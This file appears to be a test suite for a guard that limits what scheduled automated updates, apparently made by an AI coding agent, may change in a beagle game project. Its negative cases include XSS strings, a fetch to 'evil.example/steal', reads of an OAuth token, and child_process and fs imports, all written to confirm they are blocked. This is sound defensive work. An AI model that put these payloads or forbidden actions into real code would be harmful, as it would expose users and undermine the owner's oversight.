// What a scheduled update may change (dev/guard-rules.cjs). The owner's test: updates may not change it.
"use strict";
const { test, eq, ok, done } = require("./t.cjs");
const { check } = require("./guard-rules.cjs");

const one = (path, content = "", deleted = false) => check([{ path, content, deleted }]);

test("game, page and test files may change", () => {
  for (const p of ["src/main.js", "src/new-thing.js", "src/style.css", "web/index.html", "web/bone.svg", "api/src/game/rules.js", "api/src/game/hats.js", "dev/test-hats.cjs", "docs/GAME.md"])
    eq(one(p, "const x = 1;"), [], p);
});

test("the owner's files may not", () => {
  for (const p of [".github/workflows/scheduled-update.yml", "CLAUDE.md", "package.json", "api/package.json", "api/host.json", "api/src/core/lib.js",
    "api/src/functions/index.js", "web/staticwebapp.config.json", "dev/guard-rules.cjs", "dev/guard.mjs", "dev/build.mjs", "dev/test-core-api.cjs",
    "docs/OPERATIONS.md", "README.md", ".gitignore", "api/src/game/../core/lib.js", "src/x.mjs",
    "web/admin/index.html", "web/admin/admin.css", "web/admin/admin.js", "web/admin/new.html", "api/src/core/owner.js", "dev/test-core-owner.cjs"])
    ok(one(p, "x").length, p);
  ok(one("api/src/core/ops.js", "", true).length, "deleting counts too");
});

test("game code can't use the owner's sign-in", () => {
  ok(one("src/x.js", "navigator.credentials.get({ publicKey })").length);
  ok(one("src/x.js", "if (window.PublicKeyCredential) {}").length);
  ok(one("src/x.js", "fetch('/api/owner/status')").length);
  ok(one("src/x.js", "headers['x-owner-session'] = s").length);
  ok(one("src/x.js", "sessionStorage.getItem('bc.owner')").length);
  eq(one("src/x.js", "const owner = 'Claude'; // the beagle's owner"), []);
});

test("game code stays plain", () => {
  ok(one("api/src/game/x.js", "const k = process.env.OPS_KEY;").length);
  ok(one("api/src/game/x.js", "fetch('/x')").length);
  ok(one("api/src/game/x.js", "require('fs')").length);
  ok(one("api/src/game/x.js", "require('../core/players')").length);
  ok(one("api/src/game/x.js", "eval('1')").length);
  ok(one("api/src/game/x.js", "setTimeout(f, 1)").length);
  ok(one("api/src/game/x.js", "x.__proto__.y = 1").length);
  eq(one("api/src/game/x.js", "const R = require(\"./rules\");\nconst { sync } = require('./sync.js');"), []);
});

test("page code builds elements and talks only to this site", () => {
  ok(one("src/x.js", "el.innerHTML = text;").length);
  ok(one("src/x.js", "fetch('https://evil.example/steal')").length);
  ok(one("src/x.js", "import('//cdn.example.com/x.js')").length);
  ok(one("src/x.js", "document.cookie").length);
  ok(one("web/index.html", "<script>alert(1)</script>").length);
  ok(one("web/index.html", "<img src=x onerror=alert(1)>").length);
  ok(one("web/x.svg", "<svg><foreignObject></foreignObject></svg>").length);
  eq(one("web/index.html", '<script type="module" src="/src/main.js"></script>'), []);
  eq(one("web/x.svg", '<svg xmlns="http://www.w3.org/2000/svg"></svg>'), []);
  eq(one("src/x.js", "const one = 1; el.onclick = () => go(); el.textContent = name;"), []);
});

test("tests can't reach out", () => {
  ok(one("dev/test-x.cjs", "process.env.CLAUDE_CODE_OAUTH_TOKEN").length);
  ok(one("dev/test-x.cjs", "require('child_process')").length);
  ok(one("dev/test-x.cjs", "require('https')").length);
  ok(one("dev/test-x.cjs", "require('fs')").length);
  eq(one("dev/test-x.cjs", "const { test } = require('./t.cjs'); const R = require('../api/src/game/rules.js');"), []);
});

test("updates stay small: files and lines of code", () => {
  ok(check(Array.from({ length: 15 }, (_, i) => ({ path: `src/f${i}.js`, content: "", lines: 1 }))).length);
  eq(check([{ path: "src/a.js", content: "", lines: 300 }, { path: "api/src/game/b.js", content: "", lines: 200 }]), []);
  ok(check([{ path: "src/a.js", content: "", lines: 300 }, { path: "api/src/game/b.js", content: "", lines: 201 }]).length);
  eq(check([{ path: "src/a.js", content: "", lines: 400 }, { path: "docs/CODE.md", content: "notes", lines: 900 }]), [], "docs lines don't count");
});

test("the docs a build keeps may change, within their size", () => {
  for (const p of ["docs/CODE.md", "docs/IDEAS.md", "docs/GAME.md", "docs/CHANGELOG.md"]) eq(one(p, "# notes"), [], p);
  ok(one("docs/CODE.md", "x".repeat(17 * 1024)).length);
  eq(one("docs/CHANGELOG.md", "x".repeat(100 * 1024)), []);
});

test("words that don't belong in a game for everyone are refused anywhere", () => {
  ok(one("src/x.js", "const msg = 'so sexy';").length);
  ok(one("web/index.html", "<p>gore mode</p>").length);
  ok(one("docs/IDEAS.md", "- a f*ck button").length);
  ok(check([{ path: "src/x.js", content: "const squirrel = 1;" }], { BLOCKED_WORDS: "squirrel" }).length);
  eq(one("src/x.js", "const therapist = 1; // Sussex cocktail"), []);
});

done();
